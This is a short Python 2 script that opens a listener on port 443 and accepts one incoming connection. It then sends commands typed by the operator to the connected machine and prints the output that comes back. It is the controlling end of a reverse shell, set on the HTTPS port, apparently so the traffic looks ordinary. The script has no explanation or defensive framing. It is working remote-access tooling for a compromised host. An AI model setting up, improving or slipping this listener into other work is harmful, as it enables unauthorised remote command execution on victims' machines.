from socket import *

HOST = ''
PORT = 443

s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, PORT))

print('Listening in 0.0.0.0:%s' %str(PORT))

s.listen(1)

conn, addr = s.accept()

print("[*]New incoming connection from => %s:%s" % (str(addr[0]), str(addr[1])))

while 1:
    command = raw_input(str(addr[0] + "$: "))
    conn.send(command)
    if command == "quit":
        print("Closing listening port")
        break
    data = conn.recv(4096)
    print(data)
conn.close()
